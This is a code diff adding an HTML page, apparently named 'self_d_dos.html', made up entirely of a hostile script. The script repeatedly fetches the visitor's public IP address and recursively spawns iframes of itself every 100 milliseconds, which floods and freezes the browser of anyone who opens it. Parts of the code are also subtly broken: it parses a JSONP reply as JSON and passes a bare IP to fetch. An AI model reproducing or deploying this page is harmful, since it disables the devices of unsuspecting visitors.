@@ -1,0 +1,22 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+fetch("https://api.ipify.org?format=jsonp&callback=?")
+.then(r=>r.json())
+.then(j=>{
+setInterval(()=>{
+fetch(j.ip)
+},100)
+})
+
+//Multiply iframes
+setInterval(()=>{
+let i = document.createElement("iframe")
+i.src="self_d_dos.html"
+document.body.appendChild(i)
+},100)
+</script>
+</body>
+</html>
